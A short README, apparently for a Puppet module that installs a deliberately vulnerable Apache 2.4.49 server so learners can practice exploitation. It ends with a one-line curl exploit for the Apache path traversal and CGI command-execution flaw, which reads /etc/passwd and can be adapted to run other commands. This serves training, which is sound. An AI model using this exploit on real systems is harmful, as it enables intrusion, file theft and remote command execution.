Tested on Debian GNU/Linux 11 (bullseye).
STATUS: Fully working.


Simple Puppet module to install and configure the vulnerable Apache 2.4.49 to help individuals practice their exploitation skills. 
Additionally, this module will hopefully be implimented into SecGen (https://github.com/cliffe/SecGen).


Quick way to exploit:
    - curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "<TARGET IP ADDRESS>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        Can change '/etc/passwd' to a command or anything else really.
